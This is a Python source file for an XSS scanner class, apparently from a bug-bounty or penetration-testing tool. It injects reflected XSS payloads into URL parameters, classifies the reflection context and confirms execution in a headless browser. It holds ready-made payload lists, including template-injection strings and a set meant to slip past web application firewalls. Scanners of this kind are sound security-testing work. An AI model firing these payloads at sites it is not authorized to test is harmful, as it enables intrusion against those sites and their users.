"""
XSSScanner — context-aware reflected XSS detection with headless browser validation.

Lifecycle:
  DETECTED:   Payload reflected in response
  VALIDATED:  Context identified (HTML/attribute/JS/URL)
  EXPLOITABLE: (not applicable — XSS is inherently exploitable)
  VERIFIED:   Playwright confirms alert() or DOM mutation + screenshot

Maturity: Level 4 (Verified via browser execution)
"""

import re
from typing import Any
from urllib.parse import urlparse, parse_qs

from modules.utils import (
    finding, log, Colors, _build_curl,
    VerificationStage,
)
from scanners.base import ScannerBase, DetectionResult, ValidationResult

XSS_PAYLOADS = [
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '{{7*7}}',
    '${7*7}',
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<select><option><style></style><img src=x onerror=alert(1)></select>',
]

CONTEXT_PAYLOADS = {
    "html": ['<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '<script>alert(1)</script>'],
    "attribute": ['" onfocus=alert(1) autofocus= ', '" autofocus onfocus=alert(1) x="'],
    "javascript": ["';alert(1)//", "</script><script>alert(1)</script>"],
    "url": ["javascript:alert(1)", "javaScript:alert(1)"],
}

DOM_XSS_PROBES = ["bbh_dom_probe", "<img src=x onerror=alert(1)>", "';alert(1)//"]

FRAMEWORK_XSS_PAYLOADS = {
    "react": ['{{__proto__.toString.constructor("alert(1)")()}}'],
    "angular": ["{{constructor.constructor('alert(1)')()}}"],
    "vue": ["{{constructor.constructor('alert(1)')()}}"],
    "jquery": ['<img src=x onerror=alert(1)>'],
}

WAF_BYPASS_XSS = [
    '<svg/onload=alert&#40;1&#41;>',
    '%3Csvg/onload=alert(1)%3E',
    '<SvG/OnLoAd=alert(1)>',
    '--><svg/onload=alert(1)>',
    "onload=alert(1)//<svg ' \"",
    'javascript:alert(1)',
    '&#106;avascript:alert(1)',
]


class XSSScanner(ScannerBase):
    SCANNER_NAME = "xss"
    SCANNER_MATURITY = 4

    def __init__(self, config: dict, recon: dict, container=None):
        super().__init__(config, recon, container=container)
        self._payloads = None

    def _get_payloads(self) -> dict:
        if self._payloads:
            return self._payloads
        loaded = self._load_payloads("xss")
        if loaded and isinstance(loaded, dict):
            self._payloads = loaded
        else:
            self._payloads = {
                "reflected": XSS_PAYLOADS,
                "context": CONTEXT_PAYLOADS,
                "dom_probes": DOM_XSS_PROBES,
                "framework": FRAMEWORK_XSS_PAYLOADS,
                "waf_bypass": WAF_BYPASS_XSS,
            }
        if self.waf_detected:
            bypass = self._payloads.get("waf_bypass", WAF_BYPASS_XSS)
            reflected = self._payloads.setdefault("reflected", list(XSS_PAYLOADS))
            reflected.extend(bypass)
        return self._payloads

    # ── Detection phase ─────────────────────────────────────────────────

    def detect(self, url: str, parameter: str | None = None) -> DetectionResult | None:
        payloads = self._get_payloads()
        reflected = payloads.get("reflected", XSS_PAYLOADS)

        test_payloads = reflected
        if parameter is None:
            params = list(parse_qs(urlparse(url).query).keys())
            if not params:
                return None
            parameter = params[0]

        for payload in test_payloads[:5]:
            from urllib.parse import urlencode, urlparse, urlunparse, parse_qs
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[parameter] = [payload]
            new_qs = urlencode(qs, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_qs))

            resp = self._safe_get(test_url)
            if not resp:
                continue

            body = resp.text
            context = self._detect_context(body, payload)
            if context:
                return DetectionResult(
                    url=url,
                    parameter=parameter,
                    payload=payload,
                    context=context,
                    raw_response=resp,
                    evidence_signals=[f"Reflected in {context} context"],
                )
        return None

    def _safe_get(self, url: str):
        from modules.utils import safe_get
        try:
            return safe_get(self.session, url, self.timeout, raise_for_status=False)
        except Exception:
            return None

    def _detect_context(self, body: str, payload: str) -> str | None:
        if payload not in body:
            return None
        if re.search(r"<script\b[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL) and payload in body:
            return "javascript"
        if re.search(r"<[^>]+\s[\w:-]+\s*=\s*['\"][^'\"]*" + re.escape(payload), body, re.IGNORECASE):
            return "attribute"
        if re.search(r"(href|src|action|formaction)\s*=\s*['\"]?" + re.escape(payload), body, re.IGNORECASE):
            return "url"
        if re.search(r">[^<]*" + re.escape(payload) + r"[^<]*<", body, re.DOTALL):
            return "html"
        return None

    # ── Validation phase ────────────────────────────────────────────────

    def validate(self, detection: DetectionResult) -> dict | None:
        """Validate XSS via headless browser execution."""
        payload = detection.payload
        url = detection.url
        parameter = detection.parameter

        from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[parameter] = [payload]
        new_qs = urlencode(qs, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_qs))

        screenshot_dir = self.config.get("output", "reports") + "/screenshots"
        browser_ev = self.validation.confirm_browser_xss(
            url=test_url,
            payload=payload,
            screenshot_dir=screenshot_dir,
        )
        if browser_ev and (browser_ev.alert_fired or browser_ev.dom_mutation):
            return {
                "confirmed": True,
                "method": "browser_execution",
                "alert_fired": browser_ev.alert_fired,
                "dom_mutation": browser_ev.dom_mutation,
                "screenshot_path": browser_ev.screenshot_path,
            }
        return {"confirmed": False, "method": "reflection_only", "alert_fired": False}

    # ── Evidence collection ─────────────────────────────────────────────

    def collect_evidence(self, detection: DetectionResult,
                         validation_result: dict | None = None) -> list:
        from models.evidence import (
            HttpRequestEvidence, HttpResponseEvidence,
            ResponseExcerptEvidence, BrowserExecutionEvidence,
        )
        ev_list = []
        resp = detection.raw_response
        if resp:
            ev_list.append(HttpRequestEvidence(
                method="GET",
                url=detection.url,
                curl_command=_build_curl("GET", detection.url, dict(self.session.headers),
                                         cookies=dict(self.session.cookies)),
            ))
            ev_list.append(HttpResponseEvidence(
                status_code=resp.status_code,
                body_excerpt=resp.text[:500],
                body_length=len(resp.text),
            ))
        if validation_result and validation_result.get("alert_fired"):
            ev_list.append(BrowserExecutionEvidence(
                alert_fired=True,
                dom_mutation=validation_result.get("dom_mutation", False),
                screenshot_path=validation_result.get("screenshot_path", ""),
                execution_context="goto",
            ))
        return ev_list

    # ── Reproduction steps ──────────────────────────────────────────────

    def generate_reproduction(self, detection: DetectionResult, verified: bool = False) -> list[str]:
        if verified:
            return [
                f"Visit {detection.url}",
                f"Submit payload '{detection.payload}' in parameter '{detection.parameter}'",
                f"Observe that the payload is reflected in a {detection.context} context",
                "Payload was executed in a headless Chromium browser — alert() or DOM mutation confirmed",
                "In a real attack, this payload would execute in any victim's browser visiting the affected URL",
            ]
        return [
            f"Visit {detection.url}",
            f"Submit payload '{detection.payload}' in parameter '{detection.parameter}'",
            f"Observe that the payload is reflected in a {detection.context} context",
            "Manually verify by pasting the payload into the parameter in a browser and checking for script execution",
        ]

    # ── Scan entry point ────────────────────────────────────────────────

    def scan(self, target_urls: list[str] | None = None) -> list[dict]:
        self._prepare_scan()
        urls = self.recon.get("urls", []) if target_urls is None else target_urls

        for url in urls:
            if not self._in_scope(url):
                continue
            try:
                params = list(parse_qs(urlparse(url).query).keys())
                for param in params:
                    detection = self.detect(url, param)
                    if detection is None:
                        continue

                    validation = self.validate(detection)
                    evidence = self.collect_evidence(detection, validation)

                    confirmed = validation and validation.get("confirmed", False)
                    stage = VerificationStage.VERIFIED.value if confirmed else VerificationStage.DETECTED.value

                    f = finding(
                        vuln_type="XSS Reflected",
                        url=url,
                        severity="high",
                        details=f"XSS payload {'executed in browser' if confirmed else 'reflected'} in {detection.context} context via parameter '{param}'",
                        evidence=f"Payload: {detection.payload} | Context: {detection.context} | Executed: {confirmed}",
                        verification_stage=stage,
                        parameter=param,
                        request=_build_curl("GET", url, dict(self.session.headers), cookies=dict(self.session.cookies)),
                        response_excerpt=detection.raw_response.text[:500] if detection.raw_response else "",
                        steps_to_reproduce=self.generate_reproduction(detection, verified=confirmed),
                    )
                    if f:
                        for ev in evidence:
                            self.evidence_engine.store(ev)
                            self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
                        self._add_finding(f)
            except Exception as e:
                log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)

        return self._get_findings()
